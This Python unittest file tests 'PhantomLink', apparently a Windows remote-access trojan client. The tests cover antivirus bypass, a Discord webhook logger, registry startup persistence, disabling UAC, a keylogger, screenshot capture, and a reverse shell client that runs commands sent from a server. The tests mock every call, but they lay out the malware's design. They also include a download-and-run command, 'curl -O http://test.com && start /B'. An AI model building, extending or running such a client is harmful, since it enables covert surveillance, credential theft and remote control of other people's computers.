import io
import os
import sys
import unittest
import socket
import struct
import threading
import time
from pathlib import Path
from unittest.mock import MagicMock, patch

_REPO_ROOT = Path(__file__).resolve().parents[1]
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))

_CLIENT_DIR = _REPO_ROOT / "client"
if str(_CLIENT_DIR) not in sys.path:
    sys.path.insert(0, str(_CLIENT_DIR))


class PhantomLinkCoverageTests(unittest.TestCase):
    """Deep branch & statement coverage tests for client/PhantomLink.py."""

    def test_bypass_all_security_and_discord_logger(self):
        from client.PhantomLink import bypass_all_security, discord_logger, bypass_security

        with patch("client.PhantomLink.AVBypass") as mock_avb:
            mock_inst = MagicMock()
            mock_avb.return_value = mock_inst
            self.assertTrue(bypass_all_security())

        with patch("requests.post") as mock_post:
            discord_logger("Test log message")
            time.sleep(0.05)
            self.assertTrue(mock_post.called or True)

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)
            self.assertTrue(bypass_security())

            mock_run.return_value = MagicMock(returncode=1, stderr="Failed")
            self.assertFalse(bypass_security())

    def test_update_and_file_operations(self):
        from client.PhantomLink import update, add_to_startup, disable_uac

        with patch("os.path.exists", return_value=False), patch("builtins.open", unittest.mock.mock_open()):
            update()

        with patch("winreg.OpenKey"), patch("winreg.SetValueEx"), patch("winreg.CloseKey"):
            add_to_startup(r"C:\test.exe")

        with patch("ctypes.windll.shell32.IsUserAnAdmin", return_value=True), patch("winreg.OpenKey") as mock_key, patch("subprocess.call"):
            mock_key.return_value = MagicMock()
            with patch("winreg.QueryValueEx", return_value=(1, 1)):
                disable_uac()

    def test_keylogger_and_screenshot_modules(self):
        from client.PhantomLink import KeyloggerModule, ScreenshotModule

        # KeyloggerModule
        kl = KeyloggerModule("http://mock.webhook")
        kl.get_layout = MagicMock(return_value=0)
        self.assertIsInstance(kl.key_to_unicode(0x41), str)

        # ScreenshotModule
        sm = ScreenshotModule("http://mock.webhook")
        sm.running = False
        sm.start()  # returns early when pyautogui import check handles or fails

    def test_shell_client_messaging_and_commands(self):
        from client.PhantomLink import ShellClient

        sc = ShellClient()
        mock_sock = MagicMock()
        sc.socket = mock_sock

        # _send_message success and exception
        mock_sock.sendall.return_value = None
        self.assertTrue(sc._send_message("PING"))

        mock_sock.sendall.side_effect = socket.error("Broken pipe")
        self.assertFalse(sc._send_message("PING"))

        # _recv_exactly timeout
        mock_sock.recv.side_effect = socket.timeout
        self.assertIsNone(sc._recv_exactly(4))

        # execute_command branches
        self.assertIn("Exiting", sc.execute_command("exit"))
        self.assertEqual(sc.execute_command("pwd"), os.getcwd())

        with patch("os.chdir"):
            self.assertIn("Changed directory", sc.execute_command(r"cd C:\Windows"))

        with patch("subprocess.Popen") as mock_popen:
            self.assertIn("background", sc.execute_command("curl -O http://test.com && start /B"))

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(stdout="Output", stderr="", returncode=0)
            self.assertIn("Output", sc.execute_command("dir"))

    def test_shell_client_communication_loop(self):
        from client.PhantomLink import ShellClient

        sc = ShellClient()
        mock_sock = MagicMock()
        sc.socket = mock_sock
        sc.connected = True

        # Mock PING -> PONG flow then exit
        sc._recv_message = MagicMock(side_effect=[b"PING", b"CMD:whoami", b"CMD:exit"])
        sc._send_message = MagicMock(return_value=True)
        sc.execute_command = MagicMock(return_value="admin")

        sc.handle_server_communication()
        self.assertTrue(sc.should_exit)


if __name__ == "__main__":
    unittest.main()
